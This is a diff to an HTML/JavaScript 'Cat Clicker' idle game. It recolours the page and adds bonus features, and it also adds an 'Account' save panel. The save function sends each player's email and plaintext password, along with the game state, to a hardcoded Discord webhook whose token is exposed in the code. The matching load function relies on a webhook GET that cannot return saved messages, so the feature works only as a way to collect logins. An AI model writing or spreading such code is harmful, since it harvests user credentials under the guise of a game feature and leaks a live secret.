@@ -5,11 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cat Clicker</title>
     <style>
+        /* General styling for the body */
         body {
             font-family: 'Comic Sans MS', 'Chalkboard SE', 'Arial', sans-serif;
             margin: 0;
             padding: 0;
-            background: linear-gradient(to bottom, #87CEEB, #4682B4);
+            background: linear-gradient(to bottom, #FF69B4, #FFC1CC);
             color: #333;
             display: flex;
             justify-content: center;
@@ -32,7 +33,7 @@
             width: 40%;
             text-align: center;
             padding: 20px;
-            background: linear-gradient(to bottom, #87CEEB, #B0E0E6);
+            background: linear-gradient(to bottom, #FF69B4, #FFB6C1);
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
             z-index: 1;
         }
@@ -55,47 +56,90 @@
         #cps-display {
             font-size: 18px;
             color: #fff;
-            background: #4682B4;
+            background: #FF69B4;
             padding: 3px 8px;
             border-radius: 5px;
+            display: inline-block;
+        }
+        #multiplier-display {
+            font-size: 16px;
+            color: #fff;
+            background: #FF69B4;
+            padding: 3px 8px;
+            border-radius: 5px;
+            margin-top: 5px;
             display: inline-block;
         }
         #middle-section {
             width: 30%;
             padding: 10px;
-            background: #3A1C1A;
+            background: #FF8C94;
             color: #fff;
-            border-left: 2px solid #8B4513;
-            border-right: 2px solid #8B4513;
+            border-left: 2px solid #FF6A6A;
+            border-right: 2px solid #FF6A6A;
             height: calc(100vh - 40px);
             overflow-y: auto;
         }
         #middle-section h2 {
             font-size: 20px;
             margin: 0 0 10px;
-            border-bottom: 2px solid #DAA520;
+            border-bottom: 2px solid #FFD700;
             color: #FFD700;
+        }
+        #account-btn {
+            padding: 5px;
+            background: #32CD32;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        #account-btn:hover {
+            background: #3CB371;
+        }
+        #account-panel {
+            display: none;
+            margin-top: 10px;
+        }
+        #account-panel.active {
+            display: block;
+        }
+        #email-input, #password-input {
+            padding: 5px;
+            font-size: 14px;
+            margin-right: 5px;
+        }
+        #save-btn, #load-btn {
+            padding: 5px 10px;
+            background: #32CD32;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        #save-btn:hover, #load-btn:hover {
+            background: #3CB371;
         }
         #story-log {
             font-style: italic;
             margin-top: 10px;
-            background: #5A2E2C;
+            background: #FF99A6;
             padding: 5px;
             border-radius: 5px;
         }
         #panels {
             width: 30%;
             padding: 10px;
-            background: #3A1C1A;
+            background: #FF8C94;
             color: #fff;
-            border-left: 2px solid #8B4513;
+            border-left: 2px solid #FF6A6A;
             height: calc(100vh - 40px);
             overflow-y: auto;
         }
         #tabs {
             display: flex;
             justify-content: space-around;
-            background: #8B4513;
+            background: #FF6A6A;
             padding: 5px 0;
             position: sticky;
             top: 0;
@@ -103,8 +147,8 @@
         }
         .tab {
             padding: 5px 10px;
-            background: #DEB887;
-            border: 1px solid #5C4033;
+            background: #FFB6C1;
+            border: 1px solid #FF4D4D;
             border-radius: 5px 5px 0 0;
             cursor: pointer;
             transition: background 0.3s;
@@ -115,17 +159,21 @@
         .notification {
             position: absolute;
             top: -5px;
-            right: -5px;
-            width: 10px;
-            height: 10px;
+            right: -10px;
+            width: 20px;
+            height: 20px;
             background: red;
             border-radius: 50%;
+            color: white;
+            text-align: center;
+            font-size: 12px;
+            line-height: 20px;
             display: none;
         }
         .tab.has-notification .notification { display: block; }
         .panel {
-            background: #8B4513;
-            border: 2px solid #5C4033;
+            background: #FF6A6A;
+            border: 2px solid #FF4D4D;
             border-radius: 5px;
             padding: 10px;
             margin-bottom: 10px;
@@ -133,48 +181,6 @@
             display: block;
         }
         .panel.hidden { display: none; }
-        @media (max-width: 600px) {
-            .panel {
-                height: 150px; /* Match Legacy panel size on mobile */
-                overflow-y: auto;
-            }
-            button { font-size: 12px; } /* Smaller font for compact layout */
-            .upgrade-all-btn { font-size: 10px; } /* Smaller font for compact layout */
-            #cat { font-size: 150px; }
-            #container { flex-direction: column; }
-            #cat-area, #middle-section, #panels { width: 100%; height: auto; }
-            #tabs { flex-wrap: wrap; }
-            .tab { font-size: 12px; padding: 3px 5px; }
-        }
-        .panel h2 {
-            margin: 0 0 10px;
-            font-size: 18px;
-            color: #FFD700;
-            border-bottom: 1px solid #DAA520;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 40px; /* Adjust for tabs */
-            background: #8B4513;
-            padding: 5px 0;
-            z-index: 1;
-        }
-        .toggle-btn {
-            cursor: pointer;
-            background: #DAA520;
-            padding: 2px 5px;
-            border-radius: 3px;
-            font-size: 14px;
-        }
-        .sort-btn {
-            cursor: pointer;
-            background: #4682B4;
-            color: #fff;
-            padding: 2px 5px;
-            border-radius: 3px;
-            font-size: 14px;
-        }
         .upgrade-row {
             display: flex;
             justify-content: space-between;
@@ -184,8 +190,8 @@
         button {
             width: 70%;
             padding: 5px;
-            background: linear-gradient(to bottom, #DEB887, #CD853F);
-            border: 1px solid #8B4513;
+            background: linear-gradient(to bottom, #FFB6C1, #FF8C94);
+            border: 1px solid #FF6A6A;
             cursor: pointer;
             font-size: 14px;
             text-align: left;
@@ -194,9 +200,9 @@
             justify-content: space-between;
             transition: background 0.3s, border 0.3s;
         }
-        button:hover { background: linear-gradient(to bottom, #FFD700, #DAA520); }
+        button:hover { background: linear-gradient(to bottom, #FFD700, #FFC1CC); }
         button:disabled {
-            background: #8B5F45;
+            background: #FF9999;
             cursor: not-allowed;
             opacity: 0.6;
         }
@@ -217,6 +223,46 @@
             cursor: not-allowed;
             opacity: 0.6;
         }
+        .rainbow-cat {
+            position: absolute;
+            font-size: 40px;
+            animation: fall 8s linear;
+            cursor: pointer;
+            z-index: 10;
+        }
+        @keyframes fall {
+            0% { top: -50px; }
+            100% { top: 100vh; }
+        }
+        @keyframes rainbow {
+            0% { color: red; }
+            14% { color: orange; }
+            28% { color: yellow; }
+            42% { color: green; }
+            57% { color: blue; }
+            71% { color: indigo; }
+            85% { color: violet; }
+            100% { color: red; }
+        }
+        .rainbow-cat {
+            animation: rainbow 2s infinite;
+        }
+        @media (max-width: 600px) {
+            .panel {
+                height: 150px;
+                overflow-y: auto;
+            }
+            button { font-size: 12px; }
+            .upgrade-all-btn { font-size: 10px; }
+            #cat { font-size: 150px; }
+            #container { flex-direction: column; }
+            #cat-area, #middle-section, #panels { width: 100%; height: auto; }
+            #tabs { display: none; } /* Remove tabs on mobile */
+            .panel.hidden { display: none; } /* Only show active panel */
+            #account-btn { font-size: 10px; padding: 3px; }
+            #email-input, #password-input { font-size: 12px; }
+            #save-btn, #load-btn { font-size: 10px; padding: 3px 8px; }
+        }
     </style>
 </head>
 <body>
@@ -225,10 +271,17 @@
             <h1>Cat Clicker</h1>
             <div id="cp-counter">Cat Points: 0 CP</div>
             <div id="cps-display">0 CP/s</div>
+            <div id="multiplier-display">Multiplier: x1</div>
             <span id="cat">🐱</span>
         </div>
         <div id="middle-section">
-            <h2>Stats</h2>
+            <h2>Stats <button id="account-btn">Account</button></h2>
+            <div id="account-panel">
+                <input type="email" id="email-input" placeholder="Enter email">
+                <input type="password" id="password-input" placeholder="Enter password">
+                <button id="save-btn">Save</button>
+                <button id="load-btn">Load</button>
+            </div>
             <div id="story-log">“Your cat’s purrs seem oddly powerful...”</div>
         </div>
         <div id="panels">
@@ -247,19 +300,19 @@
                 </div>
             </div>
             <div class="panel" id="click-upgrades">
-                <h2>Clicking Upgrades <span class="toggle-btn" onclick="toggleSection('click-upgrades')">[-]</span> <span class="sort-btn" onclick="sortClickUpgrades()">Sort</span></h2>
+                <h2>Clicking Upgrades</h2>
                 <div class="upgrade-list" id="click-upgrades-list">
                     <!-- Populated by JS -->
                 </div>
             </div>
             <div class="panel hidden" id="helpers">
-                <h2>Cat Helpers <span class="toggle-btn" onclick="toggleSection('helpers')">[-]</span> <span class="sort-btn" onclick="sortHelpers()">Sort</span></h2>
+                <h2>Cat Helpers</h2>
                 <div class="upgrade-list" id="helpers-list">
                     <!-- Populated by JS -->
                 </div>
             </div>
             <div class="panel hidden" id="specials">
-                <h2>Special Upgrades <span class="toggle-btn" onclick="toggleSection('specials')">[-]</span> <span class="sort-btn" onclick="sortSpecials()">Sort</span></h2>
+                <h2>Special Upgrades</h2>
                 <div class="upgrade-list" id="specials-list">
                     <!-- Populated by JS -->
                 </div>
@@ -274,7 +327,7 @@
     </div>
 
     <script>
-        // Game State
+        // Game State Variables
         let cp = 0, cpPerClick = 1, cpPerSecond = 0, resets = 0, legacyMultiplier = 1, breeds = ['Tabby'];
         const colors = ['#000000', '#ff0000', '#00ff00', '#0000ff', '#ff00ff', '#00ffff', '#ffff00', '#ff8000', '#8000ff'];
         const prefixes = [
@@ -407,6 +460,7 @@
         const cat = document.getElementById('cat');
         const cpCounter = document.getElementById('cp-counter');
         const cpsDisplay = document.getElementById('cps-display');
+        const multiplierDisplay = document.getElementById('multiplier-display');
         const storyLog = document.getElementById('story-log');
         const clickPanel = document.getElementById('click-upgrades');
         const helperPanel = document.getElementById('helpers');
@@ -421,8 +475,17 @@
         const helperNotif = document.getElementById('helper-notif');
         const specialNotif = document.getElementById('special-notif');
         const legacyNotif = document.getElementById('legacy-notif');
+        const accountBtn = document.getElementById('account-btn');
+        const accountPanel = document.getElementById('account-panel');
+        const emailInput = document.getElementById('email-input');
+        const passwordInput = document.getElementById('password-input');
+        const saveBtn = document.getElementById('save-btn');
+        const loadBtn = document.getElementById('load-btn');
 
-        // Functions
+        // Webhook URL for saving/loading progress
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1347623621870223390/MnshZJcOQ7UZ03aDFq8OrA1VfbmcXYK-dp8WhZqRborySSHnIbtZ1bzKgC4haBFKewED';
+
+        // Function to format large numbers with prefixes
         function formatCP(num) {
             for (let i = prefixes.length - 1; i >= 0; i--) {
                 if (num >= prefixes[i].value) {
@@ -432,43 +495,56 @@
             return num.toFixed(0);
         }
 
+        // Function to toggle account panel visibility
+        function toggleAccountPanel() {
+            accountPanel.classList.toggle('active');
+        }
+
+        // Function to update notification dots with counts
         function updateNotifications() {
-            const hasClickUpgrade = clickUpgrades.some(u => cp >= u.cost && u.owned < 100); // Cap at 100 for balance
-            const hasHelper = helpers.some(h => cp >= h.cost && h.owned < 100); // Cap at 100 for balance
-            const hasSpecial = specials.some(s => cp >= s.cost && (!s.once || !s.owned));
-            const canReset = cp >= (10000 * Math.pow(10, resets)); // Updated reset cost
-            clickPanel.classList.toggle('has-notification', hasClickUpgrade);
-            helperPanel.classList.toggle('has-notification', hasHelper);
-            specialPanel.classList.toggle('has-notification', hasSpecial);
+            const clickCount = clickUpgrades.filter(u => cp >= u.cost && u.owned < 100).length;
+            const helperCount = helpers.filter(h => cp >= h.cost && h.owned < 100).length;
+            const specialCount = specials.filter(s => cp >= s.cost && (!s.once || !s.owned)).length;
+            const canReset = cp >= (10000 * Math.pow(10, resets));
+            clickNotif.textContent = clickCount || '';
+            helperNotif.textContent = helperCount || '';
+            specialNotif.textContent = specialCount || '';
+            legacyNotif.textContent = canReset ? '1' : '';
+            clickPanel.classList.toggle('has-notification', clickCount > 0);
+            helperPanel.classList.toggle('has-notification', helperCount > 0);
+            specialPanel.classList.toggle('has-notification', specialCount > 0);
             legacyPanel.classList.toggle('has-notification', canReset);
         }
 
+        // Function to update all displayed values
         function updateDisplay() {
             cpCounter.textContent = `Cat Points: ${formatCP(cp)} CP`;
             cpsDisplay.textContent = `${formatCP(cpPerSecond)} CP/s`;
-            resetBtn.textContent = `Reset (${formatCP(10000 * Math.pow(10, resets))} CP)`; // Updated reset cost
+            multiplierDisplay.textContent = `Multiplier: x${legacyMultiplier.toFixed(2)}`;
+            resetBtn.textContent = `Reset (${formatCP(10000 * Math.pow(10, resets))} CP)`;
             resetCount.textContent = `Resets: ${resets}`;
             breedInfo.textContent = `Breed: ${breeds[breeds.length - 1]} (${breeds.length > 1 ? '+Unique Bonus' : '+1% CP'})`;
-            cat.style.color = colors[resets % colors.length];
             populatePanels();
             updateNotifications();
         }
 
+        // Function to populate upgrade panels with buttons and owned count
         function populatePanels() {
             clickUpgradesList.innerHTML = clickUpgrades.map(u =>
-                `<div class="upgrade-row"><button class="${cp >= u.cost ? 'affordable' : ''}" onclick="buyClickUpgrade('${u.name}')">${u.icon} ${u.name} <span>${formatCP(u.cost)} CP</span></button>` +
+                `<div class="upgrade-row"><button class="${cp >= u.cost ? 'affordable' : ''}" onclick="buyClickUpgrade('${u.name}')">${u.icon} ${u.name} (x${u.owned}) <span>${formatCP(u.cost)} CP</span></button>` +
                 `<button class="upgrade-all-btn" onclick="buyAllClickUpgrade('${u.name}')">All</button></div>`
             ).join('');
             helpersList.innerHTML = helpers.map(h =>
-                `<div class="upgrade-row"><button class="${cp >= h.cost ? 'affordable' : ''}" onclick="buyHelper('${h.name}')">${h.icon} ${h.name} <span>${formatCP(h.cost)} CP</span></button>` +
+                `<div class="upgrade-row"><button class="${cp >= h.cost ? 'affordable' : ''}" onclick="buyHelper('${h.name}')">${h.icon} ${h.name} (x${h.owned}) <span>${formatCP(h.cost)} CP</span></button>` +
                 `<button class="upgrade-all-btn" onclick="buyAllHelper('${h.name}')">All</button></div>`
             ).join('');
             specialsList.innerHTML = specials.map(s =>
-                `<div class="upgrade-row"><button class="${cp >= s.cost ? 'affordable' : ''}" onclick="buySpecial('${s.name}')" ${s.owned && s.once ? 'disabled' : ''}>${s.icon} ${s.name} <span>${formatCP(s.cost)} CP</span></button>` +
+                `<div class="upgrade-row"><button class="${cp >= s.cost ? 'affordable' : ''}" onclick="buySpecial('${s.name}')" ${s.owned && s.once ? 'disabled' : ''}>${s.icon} ${s.name} ${s.owned ? '(x1)' : ''} <span>${formatCP(s.cost)} CP</span></button>` +
                 `<button class="upgrade-all-btn" onclick="buyAllSpecial('${s.name}')" ${s.owned && s.once ? 'disabled' : ''}>All</button></div>`
             ).join('');
         }
 
+        // Function to buy a clicking upgrade
         function buyClickUpgrade(name) {
             const upgrade = clickUpgrades.find(u => u.name === name);
             if (cp >= upgrade.cost) {
@@ -480,10 +556,11 @@
             }
         }
 
+        // Function to buy multiple clicking upgrades
         function buyAllClickUpgrade(name) {
             const upgrade = clickUpgrades.find(u => u.name === name);
             let count = 0;
-            while (cp >= upgrade.cost && count < 100 - upgrade.owned) { // Cap at 100
+            while (cp >= upgrade.cost && count < 100 - upgrade.owned) {
                 cp -= upgrade.cost;
                 cpPerClick += upgrade.boost;
                 upgrade.owned++;
@@ -493,6 +570,7 @@
             if (count > 0) updateDisplay();
         }
 
+        // Function to buy a helper
         function buyHelper(name) {
             const helper = helpers.find(h => h.name === name);
             if (cp >= helper.cost) {
@@ -504,10 +582,11 @@
             }
         }
 
+        // Function to buy multiple helpers
         function buyAllHelper(name) {
             const helper = helpers.find(h => h.name === name);
             let count = 0;
-            while (cp >= helper.cost && count < 100 - helper.owned) { // Cap at 100
+            while (cp >= helper.cost && count < 100 - helper.owned) {
                 cp -= helper.cost;
                 cpPerSecond += helper.cps;
                 helper.owned++;
@@ -517,6 +596,7 @@
             if (count > 0) updateDisplay();
         }
 
+        // Function to buy a special upgrade
         function buySpecial(name) {
             const special = specials.find(s => s.name === name);
             if (cp >= special.cost && (!special.once || !special.owned)) {
@@ -528,6 +608,7 @@
             }
         }
 
+        // Function to buy multiple special upgrades
         function buyAllSpecial(name) {
             const special = specials.find(s => s.name === name);
             let count = 0;
@@ -542,18 +623,21 @@
             if (count > 0) updateDisplay();
         }
 
+        // Function to reset the game for prestige with multiplier and price reset
         function resetGame() {
-            const resetCost = 10000 * Math.pow(10, resets); // Increased difficulty
+            const resetCost = 10000 * Math.pow(10, resets);
             if (cp >= resetCost) {
                 const cpBeforeReset = cp;
                 resets++;
                 cp = 0;
-                cpPerClick = 1;
-                cpPerSecond = 0;
-                clickUpgrades.forEach(u => { u.owned = 0; u.cost = u.baseCost; });
-                helpers.forEach(h => { h.owned = 0; h.cost = h.baseCost; });
-                specials.forEach(s => { s.owned = false; s.cost = s.baseCost; });
+                cpPerClick = 1; // Reset base click multiplier
+                cpPerSecond = 0; // Reset base CPS
+                legacyMultiplier = 1; // Reset legacy multiplier
+                clickUpgrades.forEach(u => { u.owned = 0; u.cost = u.baseCost; }); // Reset costs
+                helpers.forEach(h => { h.owned = 0; h.cost = h.baseCost; }); // Reset costs
+                specials.forEach(s => { s.owned = false; s.cost = s.baseCost; }); // Reset costs
                 legacyMultiplier *= 1 + (cpBeforeReset / 10000 * 0.01);
+                cat.style.color = colors[Math.floor(Math.random() * colors.length)]; // Change cat color on prestige
                 const newBreed = resets === 1 ? 'Siamese' : resets === 2 ? 'Persian' : resets === 3 ? 'Maine Coon' :
                                 resets === 4 ? 'Sphynx' : resets === 5 ? 'Bengal' : resets === 6 ? 'Ragdoll' :
                                 resets === 7 ? 'Abyssinian' : resets === 8 ? 'Scottish Fold' : resets === 9 ? 'Norwegian Forest' : `Cosmic Cat ${resets}`;
@@ -564,6 +648,7 @@
             }
         }
 
+        // Function to update the story log based on resets
         function updateStory() {
             if (resets === 0) storyLog.textContent = '“Your cat’s purrs seem oddly powerful...”';
             else if (resets <= 5) storyLog.textContent = '“Your cats reveal a cosmic destiny...”';
@@ -574,19 +659,6 @@
         }
 
         // Navigation Functions
-        function toggleSection(sectionId) {
-            const panel = document.getElementById(sectionId);
-            const list = panel.querySelector('.upgrade-list');
-            const toggleBtn = panel.querySelector('.toggle-btn');
-            if (list.style.display === 'none') {
-                list.style.display = 'block';
-                toggleBtn.textContent = '[-]';
-            } else {
-                list.style.display = 'none';
-                toggleBtn.textContent = '[+]';
-            }
-        }
-
         function showPanel(panelId) {
             const panels = document.querySelectorAll('.panel');
             const tabs = document.querySelectorAll('.tab');
@@ -597,19 +669,128 @@
             document.getElementById(panelId).scrollIntoView({ behavior: 'smooth' });
         }
 
-        function sortClickUpgrades() {
-            clickUpgrades.sort((a, b) => a.cost - b.cost);
-            updateDisplay();
+        // Function to save game progress to Discord webhook with email and password
+        async function saveProgress() {
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            if (!email || !password) {
+                alert('Please enter both email and password!');
+                return;
+            }
+            if (!isValidEmail(email)) {
+                alert('Please enter a valid email address!');
+                return;
+            }
+            const saveData = {
+                email,
+                password,
+                cp,
+                cpPerClick,
+                cpPerSecond,
+                resets,
+                legacyMultiplier,
+                clickUpgrades,
+                helpers,
+                specials,
+                breeds,
+                timestamp: new Date().toISOString()
+            };
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `**Save Data for ${email}**\n\`\`\`json\n${JSON.stringify(saveData, null, 2)}\n\`\`\``
+                    })
+                });
+                if (response.ok) {
+                    alert('Progress saved successfully!');
+                } else {
+                    alert('Failed to save progress. Check Discord webhook.');
+                }
+            } catch (error) {
+                console.error('Error saving progress:', error);
+                alert('Error saving progress. Check console for details.');
+            }
         }
 
-        function sortHelpers() {
-            helpers.sort((a, b) => a.cost - b.cost);
-            updateDisplay();
+        // Function to load game progress from Discord webhook with email and password verification
+        async function loadProgress() {
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            if (!email || !password) {
+                alert('Please enter both email and password!');
+                return;
+            }
+            if (!isValidEmail(email)) {
+                alert('Please enter a valid email address!');
+                return;
+            }
+            try {
+                const response = await fetch(WEBHOOK_URL, { method: 'GET' });
+                const messages = await response.json();
+                const userSave = messages.find(msg => msg.content.includes(email));
+                if (userSave) {
+                    const data = JSON.parse(userSave.content.match(/```json\n([\s\S]*?)\n```/)[1]);
+                    if (data.email === email && data.password === password) {
+                        cp = data.cp;
+                        cpPerClick = data.cpPerClick;
+                        cpPerSecond = data.cpPerSecond;
+                        resets = data.resets;
+                        legacyMultiplier = data.legacyMultiplier;
+                        clickUpgrades = data.clickUpgrades;
+                        helpers = data.helpers;
+                        specials = data.specials;
+                        breeds = data.breeds;
+                        updateDisplay();
+                        alert('Progress loaded successfully!');
+                    } else {
+                        alert('Email or password incorrect.');
+                    }
+                } else {
+                    alert('No save data found for this email.');
+                }
+            } catch (error) {
+                console.error('Error loading progress:', error);
+                alert('Error loading progress. Webhook may not support GET or data is unavailable.');
+            }
         }
 
-        function sortSpecials() {
-            specials.sort((a, b) => a.cost - b.cost);
-            updateDisplay();
+        // Simple email validation function
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        // Function to spawn rainbow cat bonus
+        function spawnRainbowCat() {
+            const rainbowCat = document.createElement('span');
+            rainbowCat.className = 'rainbow-cat';
+            rainbowCat.textContent = '🐱';
+            rainbowCat.style.left = Math.random() * 80 + 'vw';
+            rainbowCat.style.top = '-50px';
+            document.body.appendChild(rainbowCat);
+
+            let bonusActive = false;
+            rainbowCat.addEventListener('click', () => {
+                if (!bonusActive) {
+                    bonusActive = true;
+                    const originalMultiplier = legacyMultiplier;
+                    legacyMultiplier *= 2;
+                    updateDisplay();
+                    setTimeout(() => {
+                        legacyMultiplier = originalMultiplier;
+                        updateDisplay();
+                    }, 10000); // 10 seconds bonus
+                    rainbowCat.remove();
+                }
+            });
+
+            setTimeout(() => {
+                if (!bonusActive) rainbowCat.remove();
+            }, 8000); // 8 seconds to click
+
+            setTimeout(spawnRainbowCat, 75000); // Next cat in 75 seconds
         }
 
         // Event Listeners
@@ -619,8 +800,11 @@
             specials.forEach(s => !s.once && s.owned && s.effect());
         });
         resetBtn.addEventListener('click', resetGame);
+        saveBtn.addEventListener('click', saveProgress);
+        loadBtn.addEventListener('click', loadProgress);
+        accountBtn.addEventListener('click', toggleAccountPanel);
 
-        // Game Loop
+        // Start the game loop and rainbow cat spawn
         setInterval(() => {
             cp += cpPerSecond * legacyMultiplier;
             updateDisplay();
@@ -629,6 +813,7 @@
         // Initial Setup
         populatePanels();
         updateDisplay();
+        spawnRainbowCat(); // Start rainbow cat spawning
     </script>
 </body>
 </html>
